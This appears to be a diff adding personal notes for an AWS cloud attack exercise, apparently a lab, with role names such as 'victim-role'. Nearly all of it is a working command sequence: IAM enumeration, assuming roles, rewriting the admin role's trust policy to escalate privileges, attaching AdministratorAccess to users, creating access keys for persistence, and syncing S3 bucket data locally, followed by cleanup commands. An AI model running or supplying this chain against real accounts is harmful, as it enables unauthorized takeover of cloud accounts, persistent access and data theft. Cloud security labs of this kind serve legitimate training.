@@ -1,0 +1,119 @@
+1. priv escalation
+2. maintain persistance
+3. download s3 bucket data
+
+
+aws configure --profile engineer
+aws sts get-caller-identity --profile engineer
+
+
+
+-------------engineer-user-enum------------------------------
+customer managed
+
+aws iam list-attached-user-policies --user-name engineer --profile engineer
+aws iam get-policy --policy-arn arn:aws:iam::159030386263:policy/engineer-user-policy --profile engineer
+aws iam get-policy-version --policy-arn arn:aws:iam::159030386263:policy/engineer-user-policy --version-id v1 --profile engineer
+
+inline policies:
+aws iam list-user-policies --user-name engineer --profile engineer
+aws iam get-user-policy --user-name engineer --policy-name sts-assume-role-inline-policy --profile engineer
+--------------------------------enumerate-users--------------------------------
+
+aws iam list-users --profile engineer
+
+aws iam list-users --profile engineer
+aws iam get-policy --policy-arn arn:aws:iam::159030386263:policy/iam-moderator-assume-admin-role --profile engineer
+aws iam get-policy-version --policy-arn arn:aws:iam::159030386263:policy/iam-moderator-assume-admin-role --version-id v1 --profile engineer
+
+inline policies:
+aws iam list-user-policies --user-name iam-moderator --profile engineer
+-----------------------enumerate-roles----------------------------------------
+aws iam list-roles --profile engineer
+
+---------------get-assume-role-policy-document---or-trust-relationship------------------------
+aws iam get-role --role-name victim-role --query 'Role.AssumeRolePolicyDocument' --output json
+aws iam get-role --role-name admin-role --query 'Role.AssumeRolePolicyDocument' --output json
+---------------------------------enumerate-roles-------------------------------------------------------------
+
+aws iam list-attached-role-policies --role-name admin-role --profile engineer
+aws iam get-policy --policy-arn arn:aws:iam::159030386263:policy/admin-role-policy --profile engineer
+aws iam get-policy-version --policy-arn arn:aws:iam::159030386263:policy/admin-role-policy --version-id v1 --profile engineer
+
+
+aws iam list-attached-role-policies --role-name victim-role --profile engineer
+aws iam get-policy --policy-arn arn:aws:iam::159030386263:policy/victim-role-policy --profile engineer
+aws iam get-policy-version --policy-arn arn:aws:iam::159030386263:policy/victim-role-policy --version-id v1 --profile engineer
+
+
+-----------------------priv-esc----------------------------------------------------------------
+aws sts assume-role --role-arn arn:aws:iam::159030386263:role/admin-role --role-session-name assume-admin-role --profile engineer
+aws sts assume-role --role-arn arn:aws:iam::159030386263:role/victim-role --role-session-name assume-victim-role --profile engineer
+
+-------------
+aws configure --profile victim-role
+cd .aws
+nano credentials
+
+aws_session_token = <token>
+
+aws sts get-caller-identity --profile victim-role
+-------------------------------------------
+nano engineer-trust-policy.json
+
+{
+	"Version": "2012-10-17",
+	"Statement": [{
+		"Sid": "",
+		"Effect": "Allow",
+		"Principal": {
+			"AWS": "arn:aws:iam::159030386263:user/engineer"
+		},
+		"Action": "sts:AssumeRole"
+	}]
+}
+
+
+
+aws iam update-assume-role-policy --role-name admin-role --policy-document file://./engineer-trust-policy.json --profile victim-role
+
+-----------------------------------------------after-priv-esc-------------------------------------------------------
+aws sts assume-role --role-arn arn:aws:iam::159030386263:role/admin-role --role-session-name assume-admin-role --profile engineer
+cd .aws
+nano credentials
+
+aws_session_token = <token>
+
+aws sts get-caller-identity --profile admin-role
+aws s3 ls --profile admin-role
+------------------------------------------------------------------
+post priv esc
+
+1. escalate priv of user engineer
+aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name engineer --profile admin-role
+aws s3 ls --profile engineer
+
+2. Maintain persistance -- escalate priv of iam-moderator and create access keys
+aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name iam-moderator --profile engineer
+
+aws iam create-access-key --user-name iam-moderator --profile engineer
+
+aws configure --profile iam-moderator
+aws sts get-caller-identity --profile iam-moderator
+
+---------------data-------------------
+aws s3 ls --profile iam-moderator
+aws s3 sync s3://bucket-name /local/path
+
+
+------------------delete----------------------------------
+aws iam delete-access-key --user-name iam-moderator --access-key-id YOUR_ACCESS_KEY_ID
+
+aws iam detach-user-policy --user-name engineer --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam detach-user-policy --user-name iam-moderator --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+
+
+
+
+
